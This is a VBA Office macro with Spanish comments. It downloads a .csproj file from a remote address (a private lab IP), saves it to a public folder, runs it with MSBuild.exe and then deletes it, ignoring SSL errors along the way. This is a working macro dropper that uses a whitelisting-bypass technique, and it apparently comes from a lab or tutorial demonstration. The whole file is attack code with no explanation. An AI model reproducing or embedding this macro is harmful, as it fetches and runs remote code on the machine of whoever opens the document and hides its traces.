Sub Prueba()
'
' Prueba Macro
'
'

' Descargar el archivo del CSPROJ
' Ejecutar MSBuild

Dim archivo As String
Dim directorio As String
Dim archivoCompleto As String

archivo = "codigo.csproj"
directorio = "C:\Users\Public\YOUTUBE"
archivoCompleto = directorio & "\" & archivo

CrearDirectorio directorio
    
ChangeDirectory directorio

DescargarArchivo "http://192.168.49.128/" & archivo, archivoCompleto

Esperar 5

Ejecucion

Esperar 5

BorrarArchivo archivoCompleto

End Sub
Sub Ejecucion()
    Dim WSHShell As Object
    Set WSHShell = CreateObject("Wscript.Shell")
    WSHShell.Run "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe"
End Sub
Sub DescargarArchivo(url As String, savePath As String)
    Dim myURL As String
    Dim FileNum As Long
    Dim FileData() As Byte
    Dim WHTTP As Object
    
    Set WHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
    
    ' Ignore SSL errors
    WHTTP.Option(4) = &H3300
    
    myURL = url
    WHTTP.Open "GET", myURL, False
    WHTTP.Send
    
    FileData = WHTTP.ResponseBody
    Set WHTTP = Nothing
    
    FileNum = FreeFile
    Open savePath For Binary Access Write As #FileNum
    Put #FileNum, 1, FileData
    Close #FileNum
End Sub
Sub ChangeDirectory(path As String)
  ChDir path
End Sub

Sub BorrarArchivo(filePath As String)
  If Dir(filePath) <> "" Then
    Kill filePath
  End If
End Sub

Sub CrearDirectorio(directory As String)
  If Dir(directory, vbDirectory) = "" Then
    MkDir directory
  End If
End Sub

Sub BorrarDirectorio(directory As String)
  RmDir directory
End Sub

Sub Esperar(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
